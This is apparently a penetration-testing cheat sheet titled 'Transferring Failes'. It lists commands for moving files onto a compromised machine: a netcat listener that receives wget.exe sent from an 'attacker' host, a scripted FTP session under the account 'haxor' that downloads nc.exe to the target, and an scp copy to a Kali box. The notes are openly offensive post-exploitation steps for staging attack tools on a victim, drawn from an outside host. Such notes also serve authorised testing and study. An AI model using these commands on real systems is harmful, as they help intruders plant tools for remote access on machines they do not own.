# Transferring Failes

### nc
```
nc -nlvp 4444 > income.exe                                      # on server 
nc -nv 192.168.1.1 4444 </usr/share/windows-binaries/wget.exe   # on attacker
```

### ftp
```
# scripted download
echo open 10.x.x.x7> ftp.txt
echo haxor>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

ftp -s:ftp.txt  # will download nc.exe to current dir
```

### scp
```
scp file.txt root@kali:/tmp/
```
